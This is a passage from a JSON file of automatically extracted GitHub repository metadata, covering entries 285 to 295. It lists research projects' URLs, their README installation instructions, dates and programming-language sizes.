                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 30579
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 447
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "285": {
        "filename": "duyali2000_SemanticFlowGraph_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/duyali2000/SemanticFlowGraph",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "## Fine-tuning \n* Evaluate and fine-tune the pre-trained model with D-, ARC-, and ARCL-encoding on commits granularity.\n```\nsh run_commits_D.sh & dataset & cuda number\nsh run_commits_ARC.sh & dataset & cuda number\nsh run_commits_ARCL.sh & dataset & cuda number\n```\n* Evaluate and fine-tune the pre-trained model with D-, ARC- and ARCL-encoding on file granularity.\n```\nsh run_files_D.sh & dataset & cuda number\nsh run_files_ARC.sh & dataset & cuda number\nsh run_files_ARCL.sh & dataset & cuda number\n```\n* Evaluate and fine-tune the pre-trained model with D-, ARC-, and ARCL-encoding on hunks granularity.\n```\nsh run_hunks_D.sh & dataset & cuda number\nsh run_hunks_ARC.sh & dataset & cuda number\nsh run_hunks_ARCL.sh & dataset & cuda number\n```\nEvaluation results are saved to `retrieval_result.csv` in the `results` directory.",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/duyali2000/SemanticFlowGraph/main/INSTALL.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-21T09:14:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-25T07:37:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 154539
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 146862
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 12986
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "286": {
        "filename": "PinjiaHe_StructureInvariantTesting_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/PinjiaHe/StructureInvariantTesting",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-02-05T22:37:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-25T13:59:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 11035
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "287": {
        "filename": "sergioburdisso_pyss3_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sergioburdisso/pyss3",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "\nSimply use:\n```console\npip install pyss3\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "A Python package implementing a new simple and interpretable model for text classification",
                        "Want to give PySS3 a shot? :eyeglasses: :coffee:"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sergioburdisso/pyss3/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": ":sushi: **Online live demos:** http://tworld.io/ss3/ :icecream::ice_cream::cake: \n",
                    "original_header": "A Python package implementing a new simple and interpretable model for text classification"
                },
                "confidence": 0.9738462335345947,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sergioburdisso/pyss3/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-11-11T16:14:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-30T09:47:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 334711
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 57852
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 18099
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 758
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "288": {
        "filename": "microsoft_neurips21-self-supervised-bug-detection-and-repair_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/neurips21-self-supervised-bug-detection-and-repair",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To create a dataset with fixed (randomly selected) bugs, use the following instructions: \n1. Build the Docker container for extraction by navigating to the root directory and running. Start :\n    ```commandline\n    docker build -f deployment/dockerfiles/baseimage.Dockerfile -t buglab-base .\n    ```\n1. Create a text file containing the names of the PyPi packages to be extracted.\n    * You can find the 4k most downloaded packages [here](https://hugovk.github.io/top-pypi-packages/).\n    * You can get a list of _all_ PyPi packages using the utilities in `buglab.data.pypi.utils.get_all_pypi_packages`.\n1. Start the extraction\n    BASH2*\n   The results will be saved at the `target_dir`.\n   The code will create multiple processes each spawning\n   a Docker container that is executing the main in\n   `buglab.controllers.packageextracttodisk` that extracts the\n   data from a single package. \n",
                    "original_header": "Random Bugs Data Extraction"
                },
                "confidence": 0.9974449731783541,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/neurips21-self-supervised-bug-detection-and-repair/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We provide the PyPIBugs dataset as a set of URLs and git SHAs, which\ncan be used to re-extract the dataset. Please download the dataset from\n[here](https://www.microsoft.com/en-us/download/103554). The dataset\nhas a json lines ([JSONL](https://jsonlines.org/)) format with each\nline having the format:\n```\n{\n    \"repo\": \"url-to-git\",\n    \"hash\": \"SHA of bug fixing commit\",\n    \"diff\": \"diff hunk\",\n    \"old_path\": \"filepath wrt to repo root\",\n    \"rewrite\": \"the bug fixing rewrite metadata\"\n}\n``` \n",
                    "original_header": "PyPIBugs Dataset"
                },
                "confidence": 0.9887622781365057,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/neurips21-self-supervised-bug-detection-and-repair/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This requires GraphViz and Dot. To get the graph of a single file run\n```commandline\npython -m buglab.representations.asdot path/to/file.py output/path.dot\ndot -Tpdf output/path.dot > output/path.pdf\n```\n \n",
                    "original_header": "Visualizing graph representation"
                },
                "confidence": 0.9963944034264587,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/neurips21-self-supervised-bug-detection-and-repair/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Note that this requires an installation of [`streamlit`](https://www.streamlit.io/).\n \n",
                    "original_header": "Interactive Model Explorer"
                },
                "confidence": 0.9217648291866678,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/neurips21-self-supervised-bug-detection-and-repair/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "First, make sure you have installed [Azure CLI](https://docs.microsoft.com/en-us/cli/azure/), [terraform](https://www.terraform.io/downloads.html),\n[kubectl (kubernetes cli)](https://kubernetes.io/docs/tasks/tools/install-kubectl/), and\n[helm](https://helm.sh/).\n \n",
                    "original_header": "Infrastructure"
                },
                "confidence": 0.9892445816436888,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/neurips21-self-supervised-bug-detection-and-repair/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you are recreating this project, rather than working on an already-started version of it,\nyou will need to register an app, create a service principal, and a client secret following the instructions\n[here](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/guides/service_principal_client_secret).\nYou can find more detail on apps and service principals\n[here](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals) if you need it.\nMake sure that the service principal has \"contributor\" rights for your resource group.\n \n",
                    "original_header": "Spawning the BugLab infrastructure"
                },
                "confidence": 0.9999952467231729,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/neurips21-self-supervised-bug-detection-and-repair/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Once you have filled [`variables.tf`](deployment/terraform/variables.tf)  open up a shell and navigate to the Terraform directory\nand run `terraform init`:\n```commandline\ncd $CODE/BugLab/deployment/terraform\nterraform init\n``` \n",
                    "original_header": "Initialise Terraform"
                },
                "confidence": 0.9997768806133133,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/neurips21-self-supervised-bug-detection-and-repair/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To contribute to this project, first follow the next steps to setup your\ndevelopment environment:\n* Install the library requirements.\n* Install the pre-commit hooks:\n    * Run `pip3 install pre-commit`\n    * Install the hooks `pre-commit install` \n",
                    "original_header": "Developing"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/neurips21-self-supervised-bug-detection-and-repair/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft\ntrademarks or logos is subject to and must follow\n[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).\nUse of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.\nAny use of third-party trademarks or logos are subject to those third-party's policies.\n \n",
                    "original_header": "Trademarks"
                },
                "confidence": 0.9988852287322683,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/neurips21-self-supervised-bug-detection-and-repair/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-10-15T01:14:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T01:52:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 464247
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HCL",
                    "name": "HCL",
                    "type": "Programming_language",
                    "size": 8776
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Mustache",
                    "name": "Mustache",
                    "type": "Programming_language",
                    "size": 3448
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1837
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Smarty",
                    "name": "Smarty",
                    "type": "Programming_language",
                    "size": 1772
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 217
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "289": {
        "filename": "sulir_runtimesamp_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sulir/runtimesamp",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To build both the Java agent and the IDE plugin, run the command: \n",
                    "original_header": "Building"
                },
                "confidence": 0.9997095124156381,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sulir/runtimesamp/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-03-17T13:35:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-02-20T15:25:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 46475
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "290": {
        "filename": "Toloka_crowd-kit_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Toloka/crowd-kit",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install Crowd-Kit, run the following command: `pip install crowd-kit`. If you also want to use the `learning` subpackage, type `pip install crowd-kit[learning]`.\n\nIf you are interested in contributing to Crowd-Kit, use [uv](https://github.com/astral-sh/uv) to manage the dependencies:\n\n```shell\nuv venv\nuv pip install -e '.[dev,docs,learning]'\nuv tool run pre-commit install\n```\n\nWe use [pytest](https://pytest.org/) for testing and a variety of linters, including [pre-commit](https://pre-commit.com/), [Black](https://github.com/psf/black), [isort](https://github.com/pycqa/isort), [Flake8](https://github.com/pycqa/flake8), [pyupgrade](https://github.com/asottile/pyupgrade), and [nbQA](https://github.com/nbQA-dev/nbQA), to simplify code maintenance.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing",
                    "parent_header": [
                        "Crowd-Kit: Computational Quality Control for Crowdsourcing"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Toloka/crowd-kit/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[![PyPI Version][pypi_badge]][pypi_link]\n[![GitHub Tests][github_tests_badge]][github_tests_link]\n[![Codecov][codecov_badge]][codecov_link]\n[![Documentation][docs_badge]][docs_link]\n[![Paper][paper_badge]][paper_link] \n[pypi_badge]: https://badge.fury.io/py/crowd-kit.svg\n[pypi_link]: https://pypi.python.org/pypi/crowd-kit\n[github_tests_badge]: https://github.com/Toloka/crowd-kit/actions/workflows/tests.yml/badge.svg?branch=main\n[github_tests_link]: https://github.com/Toloka/crowd-kit/actions/workflows/tests.yml\n[codecov_badge]: https://codecov.io/gh/Toloka/crowd-kit/branch/main/graph/badge.svg\n[codecov_link]: https://codecov.io/gh/Toloka/crowd-kit\n[docs_badge]: https://readthedocs.org/projects/crowd-kit/badge/\n[docs_link]: https://crowd-kit.readthedocs.io/\n[paper_badge]: https://joss.theoj.org/papers/10.21105/joss.06227/status.svg\n[paper_link]: https://doi.org/10.21105/joss.06227 \n",
                    "original_header": "Crowd-Kit: Computational Quality Control for Crowdsourcing"
                },
                "confidence": 0.9808517490641662,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Toloka/crowd-kit/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-03-01T23:02:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-12T20:01:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 414364
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "291": {
        "filename": "celbree_ReACC_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/ReACC",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Leverage [`microsoft/reacc-py-retriever`](https://huggingface.co/microsoft/reacc-py-retriever) as a code-to-code retriever for python source codes.\n \n",
                    "original_header": "1. Pretrain a retriever"
                },
                "confidence": 0.9460853026493723,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/celbree/ReACC/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "First, you have to prepare a codebase for retrieving. It is recommended to split each file/function into small chunks. (refer to `utils/split_codes.py`). Then run the command to get representations of all the codes in search corpus.\n```bash\npython -m torch.distributed.launch --nproc_per_node=${PER_NODE_GPU} infer.py \\\n        --data_path=data/train_split.txt \\\n        --save_name=save_vec \\\n        --lang=python \\\n        --pretrained_dir=microsoft/reacc-py-retriever \\\n        --num_vec=8 \\\n        --block_size=512 \\\n        --gpu_per_node ${PER_NODE_GPU} \\\n        --logging_steps=100 \n```\n \n",
                    "original_header": "2. Build an index for search"
                },
                "confidence": 0.9115255349792656,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/celbree/ReACC/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Navigate to the `gen` folder. We adapt the code completion scripts in [CodeXGLUE](https://github.com/microsoft/CodeXGLUE/tree/main/Code-Code/CodeCompletion-line). We modify the script `dataset.py` to include similar codes as input. Run `run_lm.py` to evaluate your fine-tuned model.\n```bash\nexport CUDA_VISIBLE_DEVICES=0\nLANG=python\nDATADIR=dataset/py150\nLITFILE=${DATADIR}/literals.json\nOUTPUTDIR=save/py150\nPRETRAINDIR=py150-ckpt\n\nLOADFILE=${DATADIR}/train_split\nRESFILE=search_res.pkl\nSAVEFILE=prediction.txt\n\npython -u run_lm.py \\\n        --data_dir=$DATADIR \\\n        --lit_file=$LITFILE \\\n        --langs=$LANG \\\n        --output_dir=$OUTPUTDIR \\\n        --pretrain_dir=$PRETRAINDIR \\\n        --load_file_name=$LOADFILE \\\n        --search_res=$RESFILE \\\n        --save_name=$SAVEFILE \\\n        --model_type=gpt2 \\\n        --block_size=1024 \\\n        --eval_line \\\n        --logging_steps=100 \\\n        --seed=42 \n```\n \n",
                    "original_header": "4. Generation step"
                },
                "confidence": 0.9999971784131406,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/celbree/ReACC/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Run the `codenet_test.py` to reproduce this experiment.\n```bash\nDATADIR=CodeNet\nPRETRAINDIR=microsoft/reacc-py-retriever\n \npython -u codenet_test.py \\\n        --data_dir=$DATADIR \\\n        --pretrained_dir=$PRETRAINDIR \\\n        --lang=python \\\n        --num_vec=8 \\\n        --cut \\\n        --block_size=512 \\\n        --per_gpu_eval_batch_size=64 \\\n        --logging_steps=100 \\\n        --seed=614 \n```\n \n",
                    "original_header": "Zero-shot code clone detection"
                },
                "confidence": 0.9829929003796952,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/celbree/ReACC/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-03T02:50:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-29T11:48:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 143028
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 134
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "292": {
        "filename": "carlos-molina_conch_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/carlos-molina/conch",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "0. Install java jdk 7\n1. Clone conch repo https://github.com/gsfyrakis/conch (Branch cccv2)\n2. install mysql 5.6 https://dev.mysql.com/downloads/mysql/5.6.html#downloads\n3. download jboss-eap-6.4 https://developers.redhat.com/download-manager/file/jboss-eap-6.4.0.GA-installer.jar or jboss as 7.1.1 http://download.jboss.org/jbossas/7.1/jboss-as-7.1.1.Final/jboss-as-7.1.1.Final.zip\n4. install jboss-eap \u279c choose admin password\n5. copy conch/JBOSS-EAP-6.4 configuration/mysql folder to jboss-eap-6.4/modules/com\n6. add datasource and driver configuration in jboss-eap-6.4/standalone/configuration/standalone-full.xml file\n\n`<datasource jta=\"false\" jndi-name=\"java:jboss/datasources/RopeDS\" pool-name=\"RopeDS\" enabled=\"true\" use-ccm=\"false\">\n                    <connection-url>jdbc:mysql://127.0.0.1:3306/rope_historical</connection-url>\n                    <driver-class>com.mysql.jdbc.Driver</driver-class>\n                    <driver>mysql</driver>\n                    <security>\n                        <user-name>rope</user-name>\n                        <password>Me!Uj4^w</password>\n                    </security>\n                    <validation>\n                        <validate-on-match>false</validate-on-match>\n                        <background-validation>false</background-validation>\n                    </validation>\n                    <statement>\n                        <share-prepared-statements>false</share-prepared-statements>\n                    </statement>\n                </datasource>\n                <drivers>\n                    <driver name=\"mysql\" module=\"com.mysql\"/>\n                    <driver name=\"h2\" module=\"com.h2database.h2\">\n                        <xa-datasource-class>org.h2.jdbcx.JdbcDataSource</xa-datasource-class>\n                    </driver>\n                </drivers>`\n\n6. copy conch/JBOSS-EAP-6.4 configuration/drools to  jboss-eap-6.4/standalone/ to install default contract\n7. edit change-set.xml in  jboss-eap-6.4/standalone/drools/upload with full path to Rule.drl   \n8. `export JBOSS_HOME=<installation` path for jboss-eap-6.4>\n9. execute `conch/run.sh` script \n10. check for any exceptions\n11. install maven 3.3.9\n12. create `.mavenrc` file in user folder \n13. add  configuration to `.mavenrc`  file\n`JAVA_HOME='/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home'`\n`JAVA_OPTS=\u201c-Xms512m -Xmx1024m -Xss512k -XX:PermSize=64m -XX:MaxPermSize=128m\u201d`\n\n14. copy `conch/JBOSS-EAP-6.4/settings.xml` to `~/.m2/`\n15. follow the tutorial to adjust the configuration of the maven jboss-as plugin, if it is needed, in order to deploy the `CCC-Rest-ear.ear` archive to jboss server after each maven build.  http://mastertheboss.com/jboss-frameworks/maven-tutorials/jboss-maven/maven-jboss-as-7-plugin-tutorial\nThe configuration for the maven jboss-as plugin is on the `conch/pom.xml` file.\n\nAnother way to manually deploy the CCC-Rest-ear.ear archive is by visiting the management console of jboss: http://www.mastertheboss.com/jboss-server/jboss-deploy/how-to-deploy-an-application-remotely-with-jboss-as  \n\n16. execute in conch folder \u279e `mvn clean package jboss-as:deploy`\n17. check jboss logs for any exceptions\n    15:45:22,446 INFO  [org.jboss.as.server] (management-handler-thread - 1) JBAS015859: Deployed \u201cCCCRest-ear.ear\u201d (runtime-name : \u201cCCCRest-ear.ear\"\n18. `http://localhost:8080/CCCRest-ear-web/UploadForm.html` to upload a new set of rules to the CCC\n19. build client and run examples using client app under `conch/CCCRestClient/runClient.sh` (change path to sequence events) \n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/carlos-molina/conch/master/install.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2013-02-07T16:22:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-16T17:33:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 134522
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1304
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1154
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 168
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "293": {
        "filename": "DeepSoftwareAnalytics_CoCoSoDa_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/DeepSoftwareAnalytics/CoCoSoDa",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\nconda create -n CoCoSoDa python=3.6 -y\nconda activate CoCoSoDa\npip install torch==1.10  transformers==4.12.5 seaborn==0.11.2 fast-histogram nltk==3.6.5 networkx==2.5.1 tree_sitter tqdm prettytable gdown more-itertools tensorboardX sklearn  \n``` \n",
                    "original_header": "Environment"
                },
                "confidence": 0.9999999993386126,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/DeepSoftwareAnalytics/CoCoSoDa/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\ncd dataset\nbash get_data.sh \n``` \n| PL         | Training | Validation  |  Test  | Candidate Codes|\n| :--------- | :------: | :----: | :----: |:----: |\n| Ruby       |  24,927  | 1,400  | 1,261  |4,360|\n| JavaScript |  58,025  | 3,885  | 3,291  |13,981|\n| Java       | 164,923  | 5,183  | 10,955 |40,347|\n| Go         | 167,288  | 7,325  | 8,122  |28,120|\n| PHP        | 241,241  | 12,982 | 14,014 |52,660|\n| Python     | 251,820  | 13,914 | 14,918 |43,827| \n",
                    "original_header": "Data"
                },
                "confidence": 0.9964349862454758,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/DeepSoftwareAnalytics/CoCoSoDa/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n```\nlang=java\nbash run_fine_tune.sh $lang \n``` \n",
                    "original_header": "Fine-tuning"
                },
                "confidence": 0.9651392648406324,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/DeepSoftwareAnalytics/CoCoSoDa/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-07T12:13:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-05T13:01:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 135976
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 5327
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "294": {
        "filename": "AizazSharif_DeepOrder-ICSME21_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/T3AS/DeepOrder-ICSME21",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Clone the GitHub repository and install the dependencies.\n1. Clone the repo and go to the directory \n```\n$ git clone https://github.com/T3AS/DeepOrder-ICSME21/DeepOrder.git\n$ cd DeepOrder\n\n```\n2. Install Anaconda (for creating and activating a separate environment)\n3. Run: \n```\n$ conda create -n DeepOrder python==3.6\n$ conda activate DeepOrder\n```\n4. Inside the enviroment, run:\n```\n$ pip install -r requirements.txt\n```",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "DeepOrder"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/AizazSharif/DeepOrder-ICSME21/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-07-30T10:11:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-14T16:58:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 228898
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 99508
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 703
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "295": {
        "filename": "KTH_spork_2024-10-03.json",
        "code_repository": [
            {
